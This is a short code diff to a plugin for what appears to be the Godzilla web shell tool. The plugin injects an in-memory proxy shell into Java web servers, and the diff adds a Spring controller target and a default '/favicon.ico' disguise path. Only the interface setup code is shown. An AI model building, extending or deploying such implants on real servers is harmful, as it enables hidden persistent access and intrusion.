@@ -21,10 +21,10 @@ import java.io.InputStream;
 
 @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
 public class Suo5MemShell implements Plugin {
-    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter"};
+    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter", "Suo5SpringController"};
     private static final String CLASS_NAME = "plugins.Suo5MemShell";
     private final JPanel panel = new JPanel(new BorderLayout());
-    private final JLabel urlPatternPassLabel = new JLabel("urlPattern (servletPath): ");
+    private final JLabel urlPatternLabel = new JLabel("urlPattern/servletPath: ");
     private final JLabel typeLabel = new JLabel("type: ");
     private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
     private final JLabel filterNameLabel = new JLabel("filterName (when Suo5TomcatFilter): ");
@@ -44,12 +44,12 @@ public class Suo5MemShell implements Plugin {
         this.typeComboBox = new JComboBox(PROXY_TYPE);
         this.injectButton = new JButton("inject");
         this.resultTextArea = new RTextArea();
-        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.4\n");
+        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.5, author: X1r0z\n");
         this.splitPane = new JSplitPane();
         this.splitPane.setOrientation(0);
         this.splitPane.setDividerSize(0);
         JPanel topPanel = new JPanel();
-        topPanel.add(this.urlPatternPassLabel);
+        topPanel.add(this.urlPatternLabel);
         topPanel.add(this.urlPatternTextField);
         topPanel.add(this.filterNameLabel);
         topPanel.add(this.filterNameTextField);
